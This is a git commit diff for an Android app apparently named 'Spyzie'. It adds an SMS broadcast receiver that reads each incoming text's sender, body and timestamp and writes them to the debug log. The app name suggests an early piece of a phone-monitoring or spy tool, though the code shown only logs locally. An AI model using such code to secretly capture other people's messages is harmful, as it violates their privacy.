a9f3a17e1d72fe8c6032a13b48233726172e0adb
td.tan <td.tan@alticast.com>
2020-04-01 14:45:51 +0700

    Receiving incoming message function

--- app/src/main/java/com/tantd/spyzie/receiver/SpyzieReceiver.java
+++ app/src/main/java/com/tantd/spyzie/receiver/SpyzieReceiver.java
@@ -3,11 +3,27 @@ package com.tantd.spyzie.receiver;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.SmsMessage;
+import android.util.Log;
+
+import com.tantd.spyzie.util.Constants;
+
+import java.util.Date;
 
 public class SpyzieReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-
+        Bundle data = intent.getExtras();
+        Object[] pdus = (Object[]) data.get("pdus");
+        for (int i = 0; i < pdus.length; i++) {
+            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
+            String message = "Sender: " + smsMessage.getDisplayOriginatingAddress()
+                    + ", Display message body: " + smsMessage.getDisplayMessageBody()
+                    + ", Time: " + new Date(smsMessage.getTimestampMillis())
+                    + ", Message: " + smsMessage.getMessageBody();
+            Log.d(Constants.LOG_TAG, message);
+        }
     }
 }
